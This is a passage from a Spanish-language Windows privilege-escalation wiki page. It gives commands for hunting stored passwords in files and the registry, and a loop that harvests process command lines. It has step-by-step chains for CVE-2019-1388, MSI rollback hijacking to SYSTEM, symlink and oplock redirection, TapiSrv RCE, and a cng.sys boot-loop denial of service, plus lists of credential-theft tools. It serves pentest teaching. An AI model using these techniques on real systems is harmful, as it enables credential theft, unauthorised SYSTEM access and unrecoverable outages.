### **Búsqueda genérica de passwords en archivos y registro**

**Buscar en el contenido de archivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Buscar un archivo con un nombre determinado**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Buscar en el registro nombres de claves y contraseñas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Herramientas que buscan contraseñas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **es un plugin de msf**; he creado este plugin para **ejecutar automáticamente cada metasploit POST module que busca credenciales** dentro de la víctima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen contraseñas mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra gran herramienta para extraer contraseñas de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sesiones**, **nombres de usuario** y **contraseñas** de varias herramientas que guardan estos datos en texto plano (PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagina que **un proceso que se ejecuta como SYSTEM abre un nuevo proceso** (`OpenProcess()`) con **acceso completo**. El mismo proceso **también crea un nuevo proceso** (`CreateProcess()`) **con privilegios bajos pero heredando todos los handles abiertos del proceso principal**.\
Entonces, si tienes **acceso completo al proceso de bajo privilegio**, puedes capturar el **handle abierto hacia el proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lee este ejemplo para más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee este **otro post para una explicación más completa sobre cómo probar y abusar de más open handlers de procesos y threads heredados con distintos niveles de permisos (no solo full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Los segmentos de memoria compartida, referidos como **pipes**, permiten la comunicación entre procesos y la transferencia de datos.

Windows proporciona una característica llamada **Named Pipes**, que permite a procesos no relacionados compartir datos, incluso a través de redes diferentes. Esto se asemeja a una arquitectura cliente/servidor, con roles definidos como **named pipe server** y **named pipe client**.

Cuando datos son enviados por una **client** a través de una pipe, el **server** que configuró la pipe tiene la capacidad de **asumir la identidad** del **client**, siempre que tenga los derechos **SeImpersonate** necesarios. Identificar un **proceso privilegiado** que se comunique vía una pipe que puedas emular ofrece la oportunidad de **obtener privilegios más altos** adoptando la identidad de ese proceso cuando interactúe con la pipe que hayas establecido. Para instrucciones sobre cómo ejecutar este ataque, hay guías útiles [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).

También la siguiente herramienta permite **interceptar una comunicación de named pipe con una herramienta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite listar y ver todas las pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

El servicio Telephony (TapiSrv) en modo servidor expone `\\pipe\\tapsrv` (MS-TRP). Un cliente remoto autenticado puede abusar de la ruta de eventos asíncronos basada en mailslot para convertir `ClientAttach` en una **escritura de 4 bytes** arbitraria a cualquier archivo existente escribible por `NETWORK SERVICE`, luego obtener derechos de administrador de Telephony y cargar una DLL arbitraria como el servicio. Flujo completo:

- `ClientAttach` con `pszDomainUser` establecido a una ruta existente y escribible → el servicio la abre mediante `CreateFileW(..., OPEN_EXISTING)` y la usa para escrituras de eventos asíncronos.
- Cada evento escribe el `InitContext` controlado por el atacante desde `Initialize` en ese handle. Registra una app de línea con `LRegisterRequestRecipient` (`Req_Func 61`), desencadena `TRequestMakeCall` (`Req_Func 121`), recupera mediante `GetAsyncEvents` (`Req_Func 0`), luego anula el registro/apaga para repetir escrituras determinísticas.
- Agrégate a `[TapiAdministrators]` en `C:\Windows\TAPI\tsec.ini`, reconéctate, luego llama a `GetUIDllName` con una ruta de DLL arbitraria para ejecutar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varios

### Extensiones de archivo que podrían ejecutar código en Windows

Consulta la página **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Los enlaces clicables en Markdown enviados a `ShellExecuteExW` pueden activar manejadores de URI peligrosos (`file:`, `ms-appinstaller:` o cualquier esquema registrado) y ejecutar archivos controlados por el atacante como el usuario actual. Ver:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorización de líneas de comando en busca de contraseñas**

Al obtener una shell como un usuario, puede haber tareas programadas u otros procesos que se estén ejecutando y que **pasen credenciales en la línea de comandos**. El script siguiente captura las líneas de comandos de los procesos cada dos segundos y compara el estado actual con el anterior, mostrando cualquier diferencia.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Robar contraseñas de procesos

## De usuario de bajo privilegio a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si tienes acceso a la interfaz gráfica (vía consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar una terminal u otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto permite escalar privilegios y eludir UAC al mismo tiempo usando la misma vulnerabilidad. Además, no es necesario instalar nada y el binario usado durante el proceso está firmado y emitido por Microsoft.

Algunos de los sistemas afectados son los siguientes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## De Administrator Medium a High Integrity Level / UAC Bypass

Lee esto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Luego **lee esto para aprender sobre UAC y UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De eliminación/movimiento/renombrado arbitrario de carpeta a SYSTEM EoP

La técnica descrita [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

El ataque básicamente consiste en abusar de la funcionalidad de rollback de Windows Installer para reemplazar archivos legítimos por maliciosos durante el proceso de desinstalación. Para esto el atacante necesita crear un **malicious MSI installer** que será usado para secuestrar la carpeta `C:\Config.Msi`, la cual será utilizada más tarde por Windows Installer para almacenar archivos de rollback durante la desinstalación de otros paquetes MSI, donde los archivos de rollback habrían sido modificados para contener la carga útil maliciosa.

La técnica resumida es la siguiente:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Crear un `.msi` que instale un archivo inocuo (p. ej., `dummy.txt`) en una carpeta escribible (`TARGETDIR`).
- Marcar el instalador como **"UAC Compliant"**, de modo que un **usuario no administrador** pueda ejecutarlo.
- Mantener un **handle** abierto al archivo después de la instalación.

- Step 2: Begin Uninstall
- Desinstalar el mismo `.msi`.
- El proceso de desinstalación comienza a mover archivos a `C:\Config.Msi` y renombrarlos a archivos `.rbf` (backups de rollback).
- **Hacer polling del handle abierto** usando GetFinalPathNameByHandle para detectar cuando el archivo se convierte en `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- El `.msi` incluye una **custom uninstall action (`SyncOnRbfWritten`)** que:
- Señala cuando se ha escrito el `.rbf`.
- Luego **espera** otro evento antes de continuar la desinstalación.

- Step 4: Block Deletion of `.rbf`
- Cuando se recibe la señal, **abrir el archivo `.rbf`** sin `FILE_SHARE_DELETE` — esto **impide que sea eliminado**.
- Luego **señalar de vuelta** para que la desinstalación pueda finalizar.
- Windows Installer falla al eliminar el `.rbf`, y porque no puede eliminar todo el contenido, **`C:\Config.Msi` no se elimina**.

- Step 5: Manually Delete `.rbf`
- Tú (atacante) eliminas el archivo `.rbf` manualmente.
- Ahora **`C:\Config.Msi` está vacío**, listo para ser secuestrado.

> En este punto, **dispara la vulnerabilidad de eliminación arbitraria de carpetas a nivel SYSTEM** para borrar `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recrear la carpeta `C:\Config.Msi` tú mismo.
- Establecer **DACLs débiles** (p. ej., Everyone:F), y **mantener un handle abierto** con `WRITE_DAC`.

- Step 7: Run Another Install
- Instalar el `.msi` de nuevo, con:
- `TARGETDIR`: Ubicación escribible.
- `ERROROUT`: Una variable que fuerza un fallo.
- Esta instalación se usará para forzar nuevamente el **rollback**, que lee `.rbs` y `.rbf`.

- Step 8: Monitor for `.rbs`
- Usar `ReadDirectoryChangesW` para monitorizar `C:\Config.Msi` hasta que aparezca un nuevo `.rbs`.
- Capturar su nombre de archivo.

- Step 9: Sync Before Rollback
- El `.msi` contiene una **custom install action (`SyncBeforeRollback`)** que:
- Señala un evento cuando se crea el `.rbs`.
- Luego **espera** antes de continuar.

- Step 10: Reapply Weak ACL
- Después de recibir el evento `\.rbs created`:
- Windows Installer **vuelve a aplicar ACLs fuertes** a `C:\Config.Msi`.
- Pero dado que aún tienes un handle con `WRITE_DAC`, puedes **reaplicar ACLs débiles** nuevamente.

> Las ACLs se **aplican solo al abrir el handle**, así que aún puedes escribir en la carpeta.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Sobrescribir el archivo `.rbs` con un **fake rollback script** que instruya a Windows para:
- Restaurar tu archivo `.rbf` (DLL maliciosa) en una **ubicación privilegiada** (p. ej., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Colocar tu `.rbf` falso que contiene una **DLL payload maliciosa a nivel SYSTEM**.

- Step 12: Trigger the Rollback
- Señalar el evento de sincronización para que el instalador continúe.
- Se configura una **custom action de tipo 19 (`ErrorOut`)** para **fallar intencionalmente la instalación** en un punto conocido.
- Esto provoca que **comience el rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Lee tu `.rbs` maliciosa.
- Copia tu DLL `.rbf` en la ubicación objetivo.
- Ahora tienes tu **DLL maliciosa en una ruta cargada por SYSTEM**.

- Final Step: Execute SYSTEM Code
- Ejecuta un binario auto-elevado de confianza (p. ej., `osk.exe`) que cargue la DLL que secuestraste.
- **Boom**: Tu código se ejecuta **como SYSTEM**.


### De eliminación/movimiento/renombrado arbitrario de archivo a SYSTEM EoP

La técnica principal de rollback de MSI (la anterior) asume que puedes eliminar una carpeta entera (p. ej., `C:\Config.Msi`). ¿Pero qué pasa si tu vulnerabilidad solo permite la eliminación arbitraria de archivos?

Podrías explotar los internals de NTFS: cada carpeta tiene un flujo de datos alterno oculto llamado:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este stream almacena los **metadatos del índice** de la carpeta.

Por tanto, si **eliminas el stream `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina toda la carpeta** del sistema de archivos.

Puedes hacer esto usando APIs estándar de eliminación de archivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Aunque estás llamando a una API de eliminación de *file*, esta **elimina la carpeta en sí**.

### From Folder Contents Delete to SYSTEM EoP
¿Qué pasa si tu primitive no te permite eliminar archivos/carpetas arbitrarios, pero **sí permite la eliminación de los *contents* de una carpeta controlada por el atacante**?

1. Paso 1: Configura una carpeta señuelo y un archivo
- Crear: `C:\temp\folder1`
- Dentro de ella: `C:\temp\folder1\file1.txt`

2. Paso 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso privilegiado intenta eliminar `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Paso 3: Activar el proceso SYSTEM (por ejemplo, `SilentCleanup`)
- Este proceso escanea carpetas (por ejemplo, `%TEMP%`) e intenta eliminar su contenido.
- Cuando llega a `file1.txt`, el **oplock triggers** y cede el control a tu callback.

4. Paso 4: Dentro del callback del oplock – redirigir la eliminación

- Opción A: Mover `file1.txt` a otro lugar
- Esto vacía `folder1` sin romper el oplock.
- No elimines `file1.txt` directamente — eso liberaría el oplock prematuramente.

- Opción B: Convertir `folder1` en una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opción C: Crear un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Esto apunta al stream interno de NTFS que almacena los metadatos de la carpeta — eliminarlo elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido al junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` es eliminado por SYSTEM.

### De Arbitrary Folder Create a DoS permanente

Explota una primitiva que te permite **create an arbitrary folder as SYSTEM/admin** — incluso si **you can’t write files** o **set weak permissions**.

Crea un **folder** (no un file) con el nombre de un **critical Windows driver**, p. ej.:
```
C:\Windows\System32\cng.sys
```
- Esta ruta normalmente corresponde al driver en modo kernel `cng.sys`.
- Si la **pre-creas como una carpeta**, Windows no carga el driver real en el arranque.
- Luego, Windows intenta cargar `cng.sys` durante el arranque.
- Ve la carpeta, **no logra resolver el driver real**, y **se bloquea o detiene el arranque**.
- No hay **plan de respaldo**, y **no hay recuperación** sin intervención externa (p. ej., reparación de arranque o acceso al disco).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Cuando un **servicio privilegiado** escribe logs/exports en una ruta leída desde una **configuración escribible**, redirige esa ruta con **Object Manager symlinks + NTFS mount points** para convertir la escritura privilegiada en una sobrescritura arbitraria (incluso **sin** SeCreateSymbolicLinkPrivilege).

**Requirements**
- La config que almacena la ruta objetivo es escribible por el atacante (p. ej., `%ProgramData%\...\.ini`).
- Capacidad para crear un punto de montaje a `\RPC Control` y un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Una operación privilegiada que escriba en esa ruta (log, export, report).

**Example chain**
1. Leer la config para recuperar el destino de logs privilegiado, p. ej. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` en `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirigir la ruta sin privilegios de administrador:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espera a que el componente privilegiado escriba el registro (p. ej., el administrador activa "send test SMS"). Ahora la escritura queda en `C:\Windows\System32\cng.sys`.
4. Inspecciona el objetivo sobrescrito (hex/PE parser) para confirmar la corrupción; un reinicio obliga a Windows a cargar la ruta del driver manipulada → **boot loop DoS**. Esto también se generaliza a cualquier archivo protegido que un servicio privilegiado abra para escritura.

> `cng.sys` normalmente se carga desde `C:\Windows\System32\drivers\cng.sys`, pero si existe una copia en `C:\Windows\System32\cng.sys` puede intentarse primero, convirtiéndolo en un sumidero DoS fiable para datos corruptos.



## **De High Integrity a SYSTEM**

### **Nuevo servicio**

Si ya estás ejecutando en un proceso High Integrity, la **ruta a SYSTEM** puede ser sencilla simplemente **creando y ejecutando un nuevo servicio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Cuando crees un binario de servicio asegúrate de que sea un servicio válido o de que el binario realice las acciones necesarias rápidamente, ya que será terminado en 20s si no es un servicio válido.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[Más información sobre las claves de registro implicadas y cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puedes** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si tienes esos privilegios de token (probablemente los encontrarás en un High Integrity process), podrás **abrir casi cualquier proceso** (no procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Al usar esta técnica normalmente se **selecciona cualquier proceso que se esté ejecutando como SYSTEM con todos los privilegios de token** (_sí, puedes encontrar procesos SYSTEM sin todos los privilegios de token_).\
**Puedes encontrar un** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
Si quieres [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si consigues **hijack una dll** que está siendo **loaded** por un **proceso** que se ejecuta como **SYSTEM** podrás ejecutar código arbitrario con esos permisos. Por tanto Dll Hijacking también es útil para este tipo de escalada de privilegios y, además, es mucho **más fácil de lograr desde un high integrity process**, ya que tendrá **permisos de escritura** en las carpetas usadas para load dlls.\
**Puedes** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lee:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Mejor herramienta para buscar vectores de escalada de privilegios locales en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Comprueba misconfiguraciones y archivos sensibles (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Comprueba algunas posibles misconfiguraciones y recopila info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Comprueba misconfiguraciones**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales del Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta PowerShell ADIDNS/LLMNR/mDNS spoofer y man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Busca vulnerabilidades privesc conocidas (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Comprobaciones locales **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busca vulnerabilidades privesc conocidas (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host buscando misconfiguraciones (más una herramienta para gather info que para privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Revisa misconfiguraciones (ejecutable precompilado en github). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Comprueba posibles misconfiguraciones (exe from python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada basada en este post (no necesita accesschk para funcionar correctamente pero puede usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referencias

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
